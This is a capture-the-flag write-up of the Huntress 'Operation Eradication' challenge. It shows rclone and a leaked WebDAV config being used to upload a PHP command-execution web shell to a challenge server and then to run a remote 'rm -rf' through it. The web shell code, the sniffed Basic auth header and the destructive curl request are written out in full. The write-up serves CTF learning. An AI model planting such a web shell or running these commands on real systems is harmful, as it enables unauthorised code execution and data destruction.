---
title: "Operation Eradication"
description: "Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!"
author: "huntress"
date: "2023-10-14"
published: true
tags: ["capture the flag", "huntress", "malware", "web", "networks"]
---

# Operation Eradication

<aside>
Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!
<strong>They stole our data!</strong>
Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
</aside>


The challenge gives us a containerized HTTP server instance - `http://chal.ctf.games:30236/` - alongside a file with no extension, named simply `operation_eradication`.
Passing it as an arg for the `file` command, we're told it's just plaintext ASCII. Viewing it's contents, we are shown the following:

```toml
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Doing a little bit of googling, we can ascertain the remote server is likely running a `WebDAV` ("Web-Distributed Authoring and Versioning") protocol service, which is effectively a (now-obselete) type of file storage service.
As indicated by the config's `url` param, we are able to access the service's front-end by adjusting the `localhost` address to our assigned wide-area address, `http://chal.ctf.games:30236/webdav`.
The page is simply a blank white screen, so I assume we need to authenticate before we are able to see the _actual_ content.

After briefly reviewing WebDAV documentation alongside the tech stack used on the WebDAV endpoint, we can see the server accepts authentication via a `Basic` Authorization header, which we can craft by running
`echo -n <username>:<password> | base64 --wrap=0` in a bash terminal, replacing the `<username>` and `<password>` strings with the user's authentication info.

![1](/img/operation_eradication_img/Untitled.png)
>The root endpoint

![Untitled](/img/operation_eradication_img/Untitled%201.png)
>The `/webdav` endpoint

To me, those `user` and `pass` strings look like they've been hashed or encrypted, but we can try to make a GET request using the strings as the username and password anyway:
```bash
# base64-encode `username:password`
USER_AUTH=$(echo -n "VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r:HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5" | base64 --wrap=0)

# make a request
curl http://chal.ctf.games:30236/webdav
   -H "Authorization: Basic $USER_AUTH"
```

As expected, this isn't correct.

![Untitled](/img/operation_eradication_img/Untitled%202.png)

We can try to do a bit of hashcracking & decryption, but we have no idea how these strings have been hashed - the `user` and `pass` strings are 72 characters long (i.e they don't look like a common hash type),
and preliminary hash analysis tools, google, and ChatGPT similarly have no idea.

We can instead Google the config file's layout, and find that it (probably) belongs to a WebDAV client CLI tool named `Rclone`.

Downloading Rclone, I was unable to simply dump the provided configuration file into the corresponding Rclone folder, but we can instead run through the setup to create our own (empty) config file,
and then replace it's content with that of the provided file:

```powershell
.\\rclone config

# ...
# this runs us through a config setup wizard...
# ...

Current remotes:

Name                 Type
====                 ====
huntress             webdav

# ...

s) Set configuration password
q) Quit config
e/n/d/r/c/s/q> q

# then replace it's contents with our desired config
# (don't forget that the service isn't running locally):

echo "[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5" > C:\\Users\\pls\\AppData\\Roaming\\rclone\\rclone.conf

cat C:\\Users\\pls\\AppData\\Roaming\\rclone\\rclone.conf
[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Having never used Rclone or interacted with a WebDAV service, it took a moment to get used to the commands and how we are meant to interact with a WebDAV service.
Essentially, we don't have to login and use an interactive shell like we might over SSH or FTP; rather, we simply indicate what config to use and run the command.

Lets try listing the WebDAV’s contents to see if our configuration works:

```powershell
.\\rclone tree huntress:
/
├── Accounting
│   ├── 2021
│   │   └── AnnualReport.pdf
│   ├── 2022
│   │   ├── Quarter1_MonthlyRevenue.xlsx
# ...
│   └── Training
│       ├── 2022
│       │   ├── AdvancedSalesSkillsCourse.pdf
│       │   └── NewSalesRepTraining.pdf
│       └── SalesTrainingManual.pdf
```

Looks like its functional. Unfortunately, we - or, rather, our WebDAV credentials - do not have the necessary permissions to run `.\\rclone delete huntress:/`.

We do, however, have write permissions, and so we are able to upload and save files onto the machine.

As is my immediate thought with any PHP service during a CTF, we are probably meant to gain code execution as `www-data` (who would usually have ownership of `/var/www/html/`, which likely contains the `/webdav` endpoint),
so my immediate thought is that we can try to execute code through a PHP script.

As previously stipulated, Rclone/WebDAV is non-interactive, so we’ll have to try to run something from the HTTP service. The service isn't locally available either, so the remote machine probably can't issue a direct call to our
machine, and we would need to run a tunnel via `ngrok` or something, and I honestly don’t want to overcomplicate the task when we can do what we want via a PHP `cmd` script and pass the server shell commands in GET request parameters:

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
> A simple PHP script that will run commands on the remote machine via the `system($cmd)` builtin, where `$cmd` is defined through a URL GET request parameter.

Copying the `cmd` script over, we are able to see that this is successfully written in the root directory of the WebDAV endpoint:

```powershell
.\\rclone copy C:\\...\\exec.php huntress:/
.\\rclone ls huntress:/
       50 exec.php
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  3510400 HumanResources/EmployeeHandbook.pdf
  7680849 ProductDevelopment/Specifications/NewProductSpecs.pdf
  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs.pdf
  ...
```

We are now missing one final piece before we can wipe the endpoint - we still don’t have the authentication info, and the approach I am taking requires that we make a request _without_ Rclone.

Because the service uses unencrypted HTTP, we can intercept traffic routed between Rclone and WebDAV using `Wireshark`; the result of which is the following:

```powershell
PROPFIND /webdav/ HTTP/1.1
Host: chal.ctf.games:30236
User-Agent: rclone/v1.64.2
Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz
Depth: 1
Referer: http://chal.ctf.games:30236/webdav/
Accept-Encoding: gzip
```
> Intercepted header information from a `.\\rclone ls huntress:/` command.

We can now use `curl` to execute `bash -c "rm -rf <[the webdav endpoint]>...";`  as a `GET` param passed to the `exec.php` file we just uploaded - I’ve included an additional `echo 'done'` command after running `rm -rf` just to
ensure I know whether or not we executed any commands, as a sanity check if something doesn't end up working.

Realistically, though, we are just querying the script we uploaded, and using the URL param `?cmd=..` to open a bash shell and literally just execute bash commands. There is the authentication stuff here, but that was basically
pre-generated by Wireshark anyway.

The final request (along with it's response) is as follows:

```bash
curl -i -s -k -X $'GET' \\
    -H $'Host: localhost' -H $'User-Agent: rclone/v1.64.2' \\
    -H $'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz' \\
		-H $'Depth: 1' -H $'Referer: http://chal.ctf.games:30236/webdav/' -H $'Accept-Encoding: gzip' -H $'Content-Type: application/x-httpd-php' \\
    $'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'done.\\'\\"'

HTTP/1.1 200 OK
Date: Fri, 20 Oct 2023 18:24:02 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Encoding: gzip
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

We can go back and refresh the webapp's root directory, where we are presented with our flag:

![Untitled](/img/operation_eradication_img/Untitled%203.png)

